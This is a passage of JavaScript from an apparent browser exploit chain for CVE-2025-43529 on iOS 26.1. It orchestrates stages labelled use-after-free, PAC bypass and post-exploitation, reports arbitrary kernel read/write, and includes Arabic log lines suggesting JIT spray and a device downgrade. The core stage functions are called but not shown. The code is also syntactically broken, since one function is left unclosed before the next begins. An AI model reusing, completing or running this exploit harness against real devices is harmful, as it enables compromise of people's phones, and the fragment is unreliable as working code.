    if (!evidence.inlineWrite && !evidence.arbRW) {
        log('\nRECOMMENDATION:', 'warn');
        log('  PAC blocks direct m_vector access. Alternatives:', 'info');
        log('  1. استخدم inline property access للقراءة فقط', 'info');
        log('  2. استخدم JIT spray + signal handler (موجود في الكود)', 'info');
        log('  3. صحح الجهاز إلى iOS 18.7.2 أو أقل عشان ANGLE يشتغل', 'info');
    }

    log('STAGE 3 COMPLETE', 'success');
    exploitState.stage3 = true;
    return true;
}

async function runFullChain() {
    document.querySelectorAll('button').forEach(b => b.disabled = true);
    startHeartbeat();

    log('', 'info');
    log('===========================================', 'critical');
    log('CVE-2025-43529 FULL EXPLOIT CHAIN (iOS 26.1)', 'critical');
    log('===========================================', 'critical');
    log('Authorization: Confirmed', 'success');

    detectSystem();

    // Stage 1: UAF
    const s1 = await runStage1();
    if (!s1) { stopHeartbeat('Stage 1 failed', false); return; }

    // Stage 2: PAC Bypass
    const s2 = await runPACBypass();
    if (!s2) { log('Stage 2 partial — continuing with limited primitives', 'warn'); }

    // Stage 3: Post-Exploitation
    await runStage3();

    // نتيجة نهائية
    log('\n===== FINAL RESULT =====', 'critical');
    const anyRW = evidence.arbRW || evidence.inlineWrite;
    if (anyRW) {
        log('ABR R/W ACHIEVED on iOS 26.1!', 'critical');
        log('يمكنك قراءة/كتابة kernel memory (حسب PAC state)', 'critical');
        stopHeartbeat('Chain complete — arb r/w achieved', true);
    } else if (evidence.addrof && evidence.fakeobj) {
        log('PARTIAL — addrof/fakeobj working, PAC blocks write', 'warn');
        stopHeartbeat('Chain complete — address leak only', true);
    } else {
        stopHeartbeat('Chain failed', false);
    }
}

async function runStage1Only() {

    detectSystem();
    await runStage1();

async function runBypassOnly() {
    document.querySelectorAll('button').forEach(b => b.disabled = true);
    startHeartbeat();
    if (!exploitState.stage1) {
        log('Running Stage 1 first...', 'info');
        if (!(await runStage1())) {
            stopHeartbeat('Stage 1 failed', false);
            return;
        }
    }
    await runPACBypass();
    stopHeartbeat(exploitState.pacBypassed ? 'PAC bypassed' : 'PAC still blocking', exploitState.pacBypassed);
}
